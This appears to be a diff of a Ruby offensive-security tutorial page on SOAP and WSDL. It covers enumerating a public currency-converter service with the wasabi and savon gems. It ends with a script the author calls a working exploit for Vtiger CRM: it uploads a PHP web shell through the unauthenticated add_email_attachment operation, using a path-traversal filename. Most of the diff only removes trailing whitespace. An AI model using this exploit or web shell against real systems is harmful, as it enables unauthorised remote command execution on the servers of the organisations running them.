@@ -3,8 +3,9 @@
 ### SOAP - WSDL
 Generally speaking, dealing with SOAP means dealing with XML messages and a WSDL file (also XML) that describes how to use a given SOAP API. Ruby has really elegant way to do so and let's to get our hand dirty with an exploit
 
+- Install wasabi, sabvon & httpclient gems
 ```
-gem install wasabi savon httpclient 
+gem install wasabi savon httpclient
 ```
 
 #### Enumeration
@@ -16,13 +17,13 @@ url = "http://www.webservicex.net/CurrencyConvertor.asmx?WSDL"
 
 document = Wasabi.document url
 
-# Parsing the document 
+# Parsing the document
 document.parser
 
 # SOAP XML
 document.xml
 
-# Getting the endpoint 
+# Getting the endpoint
 document.endpoint
 
 # Getting the target namespace
@@ -34,7 +35,7 @@ document.operations
 # Enumerate input parameters for particular operation
 document.operation_input_parameters :conversion_rate
 
-# Enumerate all available currencies 
+# Enumerate all available currencies
 document.parser.document.element_children.children[1].children[1].children[3].children[1].children.map {|c| c.attributes.values[0].to_s}
 
 ```
@@ -46,7 +47,7 @@ Results
 => "http://www.webservicex.net/CurrencyConvertor.asmx?WSDL"
 >> document = Wasabi.document url
 => #<Wasabi::Document:0x00000002c79a50 @adapter=nil, @document="http://www.webservicex.net/CurrencyConvertor.asmx?WSDL">
->> # Parsing the document 
+>> # Parsing the document
 >> document.parser
 => #<Wasabi::Parser:0x0000000281ebb8
  @deferred_types=[],
@@ -61,7 +62,7 @@ Results
         children = [
           #(Text "\n  "),
 ---kipped---
->> # Getting the endpoint 
+>> # Getting the endpoint
 >> document.endpoint
 => #<URI::HTTP http://www.webservicex.net/CurrencyConvertor.asmx>
 >> # Getting the target namespace
@@ -80,7 +81,7 @@ Results
 => {:FromCurrency=>{:name=>"FromCurrency", :type=>"Currency"}, :ToCurrency=>{:name=>"ToCurrency", :type=>"Currency"}}
 ```
 
-#### Interaction 
+#### Interaction
 
 ```ruby
 require 'savon'
@@ -106,9 +107,9 @@ Results
 ```
 
 
-#### Hacking via SOAP vulnerabilities 
+#### Hacking via SOAP vulnerabilities
 
-This is a working exploit for Vtiger CRM SOAP from auth-bypass to shell upload 
+This is a working exploit for Vtiger CRM SOAP from auth-bypass to shell upload
 ```ruby
 #!/usr/bin/env ruby
 # KING SABRI | @KINGSABRI
@@ -125,22 +126,22 @@ end
 
 shell_data, shell_name = "<?php system($_GET['cmd']); ?>", "shell-#{rand(100)}.php"
 
-# Start client 
+# Start client
 client = Savon::Client.new(wsdl: url)
 
-# List all available operations 
+# List all available operations
 puts "[*] List all available operations "
 puts client.operations
 
 puts "\n\n[*] Interact with :add_email_attachment operation"
-response = client.call( :add_email_attachment, 
+response = client.call( :add_email_attachment,
                         message: {
                                      emailid:  rand(100),
                                      filedata: [shell_data].pack("m0"),
                                      filename: "../../../../../../#{shell_name}",
                                      filesize: shell_data.size,
                                      filetype: "php",
-                                     username: "KING", 
+                                     username: "KING",
                                      sessionid: nil
                                 }
                       )
